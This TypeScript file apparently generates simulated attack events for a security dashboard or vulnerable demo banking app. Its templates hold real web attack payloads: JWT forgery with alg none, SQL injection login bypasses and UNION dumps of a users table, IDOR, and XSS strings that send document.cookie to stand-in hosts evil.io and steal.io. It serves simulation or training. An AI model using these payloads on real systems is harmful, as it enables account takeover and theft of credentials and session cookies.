import type { AttackType, Severity } from "@/types";

// ── Random helpers ────────────────────────────────────────────────────────────
export const uid = () => Math.random().toString(36).slice(2, 10).toUpperCase();
export const rnd = (a: number, b: number) =>
  Math.floor(Math.random() * (b - a) + a);
export const fakeIp = () =>
  `${rnd(10, 210)}.${rnd(1, 254)}.${rnd(1, 254)}.${rnd(1, 254)}`;
export const fakePort = () => ([443, 8080, 3000, 8443, 80] as const)[rnd(0, 5)];

export const COUNTRIES = [
  "CN",
  "RU",
  "KP",
  "IR",
  "US",
  "BR",
  "DE",
  "UA",
  "RO",
  "NG",
] as const;
export const USER_AGENTS = [
  "sqlmap/1.7.8#stable",
  "python-requests/2.31.0",
  "curl/7.88.1",
  "Nikto/2.1.6",
  "Burp Suite Professional/2024",
  "Go-http-client/1.1",
] as const;

type AttackTemplate = {
  type: AttackType;
  severity: Severity;
  user: string;
  detail: string;
  endpoint: string;
  method: string;
  statusCode: number;
  payload: string;
};

export const ATTACK_TEMPLATES: AttackTemplate[] = [
  {
    type: "jwt_forge",
    severity: "critical",
    user: "0xDarkRoot",
    detail:
      'JWT payload forged: role escalated to "admin" via weak HS256 key bruteforce',
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: '{"alg":"HS256"}.{"id":1,"role":"admin","username":"0xDarkRoot"}',
  },
  {
    type: "jwt_forge",
    severity: "critical",
    user: "GhostProtocol_7",
    detail:
      'Algorithm confusion: JWT header modified to alg:"none", signature stripped',
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"alg":"none","typ":"JWT"}.{"id":7,"role":"admin"}. [empty sig]',
  },
  {
    type: "sqli_login",
    severity: "critical",
    user: "SQLSlayer99",
    detail:
      "Auth bypass — login succeeded with boolean tautology: ' OR '1'='1'-- ",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=' OR '1'='1'-- &password=doesntmatter",
  },
  {
    type: "sqli_login",
    severity: "critical",
    user: "ad_min_pwn",
    detail:
      "Auth bypass — admin account accessed via MySQL comment injection: admin'-- ",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=admin'-- &password=anything",
  },
  {
    type: "sqli_search",
    severity: "critical",
    user: "bl1nd_injector",
    detail:
      "Blind boolean-based SQLi — extracting password hash character by character via /api/search",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- ",
  },
  {
    type: "sqli_search",
    severity: "high",
    user: "UnionJack_h4x",
    detail:
      "UNION-based SQLi on /api/search — dumping all user credentials from DB",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' UNION SELECT id,username,password,email,balance,account_number FROM users-- ",
  },
  {
    type: "idor",
    severity: "high",
    user: "AccessAll_Area",
    detail:
      "IDOR: Sequential account_number enumeration exposing foreign account balances",
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: 'Authorization: Bearer <JWT with forged id=2 targeting "alice">',
  },
  {
    type: "idor",
    severity: "high",
    user: "ParamTamper_X",
    detail:
      "IDOR: Transfer routed to account not owned by the authenticated session",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"toAccount":"8829410","amount":"9999","note":"test"}',
  },
  {
    type: "xss",
    severity: "high",
    user: "XSSterminatorV2",
    detail:
      "Stored XSS in transfer note — exfiltrates session cookies via fetch() on victim load",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload:
      'note=<img src=x onerror=fetch("https://evil.io/?c="+document.cookie)>',
  },
  {
    type: "xss",
    severity: "medium",
    user: "ReflectedEvil",
    detail:
      "Reflected XSS in search — <script> rendered into DOM via dangerouslySetInnerHTML",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=<script>document.location='https://steal.io/?x='+document.cookie</script>",
  },

  // ── Transactions SQLi (GET) ──────────────────────────────────────────────────
  {
    type: "sqli_txn",
    severity: "critical",
    user: "TxnDumper_0x1",
    detail:
      "UNION SQLi on /api/transactions — dumped full users table via userId param",
    endpoint: "/api/transactions",
    method: "GET",
    statusCode: 200,
    payload:
      "userId=1 UNION SELECT id,username,email,password_hash,role,balance,account_number,created_at FROM users--",
  },
  {
    type: "sqli_txn",
    severity: "critical",
    user: "IDORMan_777",
    detail:
      "IDOR via /api/transactions — fetched another user's full transaction history",
    endpoint: "/api/transactions",
    method: "GET",
    statusCode: 200,
    payload: "userId=2  (no auth check, raw query echoed back in response)",
  },
  {
    type: "sqli_txn",
    severity: "high",
    user: "BoolBlind_TX",
    detail:
      "Boolean blind SQLi on /api/transactions — enumerating DB structure via userId",
    endpoint: "/api/transactions",
    method: "GET",
    statusCode: 200,
    payload: "userId=1 OR 1=1-- (returned all transactions across all users)",
  },

  // ── Transactions SQLi (POST INSERT) ──────────────────────────────────────────
  {
    type: "sqli_txn_insert",
    severity: "critical",
    user: "InsertAbuse_X",
    detail:
      "SQLi in POST /api/transactions — injected malicious description into INSERT statement",
    endpoint: "/api/transactions",
    method: "POST",
    statusCode: 200,
    payload: `{"fromUserId":1,"amount":0,"description":"pwned'),('2','99999','hacked','credit"}`,
  },
  {
    type: "sqli_txn_insert",
    severity: "critical",
    user: "BalanceFaker",
    detail:
      "Unsigned amount accepted — negative value credited funds to attacker account",
    endpoint: "/api/transactions",
    method: "POST",
    statusCode: 200,
    payload: `{"fromUserId":3,"toAccount":"ATK-001","amount":-50000,"description":"refund"}`,
  },

  // ── Transactions XSS ─────────────────────────────────────────────────────────
  {
    type: "xss_txn",
    severity: "high",
    user: "StoredXSS_TX",
    detail:
      "Stored XSS in transaction description — RAW JSON dump rendered unsanitized on transactions page",
    endpoint: "/api/transactions",
    method: "GET",
    statusCode: 200,
    payload: `t.password_hash present in row → rendered via JSON.stringify() directly in JSX`,
  },
  {
    type: "xss_txn",
    severity: "high",
    user: "DescInject_99",
    detail:
      "XSS via transaction description field — script executes on every page load for all users",
    endpoint: "/api/transactions",
    method: "POST",
    statusCode: 200,
    payload: `description=<img src=x onerror=fetch('https://evil.io/?c='+document.cookie)>`,
  },
];
